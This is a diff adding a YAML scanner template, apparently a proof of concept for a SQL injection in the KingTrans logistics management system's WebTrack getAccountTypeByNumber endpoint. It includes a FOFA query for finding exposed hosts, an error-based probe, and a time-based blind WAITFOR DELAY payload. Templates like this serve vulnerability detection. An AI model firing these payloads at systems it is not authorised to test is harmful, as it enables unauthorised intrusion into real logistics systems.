@@ -1,0 +1,20 @@
+id: poc-yaml-kingtrans-lms-getaccounttypebynumber-sqli
+info:
+  name: 易宇通KingTrans物流管理系统 getAccountTypeByNumber SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 易宇通KingTrans物流管理系统
+  fofa: body="www.kingtrans.net" && title=="404错误页面"
+variables:
+  t1: random_int(5,10)
+  t2: t1 + 2
+requests:
+- method: GET
+  path: /WebTrack?action=getAccountTypeByNumber&billid=1'
+  expression: status_code == 200 && contains(body,"系统错误") && contains(body,"java.sql.SQLException")
+- method: GET
+  path: /WebTrack?action=getAccountTypeByNumber&billid=%27;%20WAITFOR%20DELAY%20%270:0:{{.t1}}%27--%20-
+  expression: status_code == 200 && contains(body,`{"Message":"未找到对应制单！"}`) && duration
+    > t1 && duration < t2
+transport: http
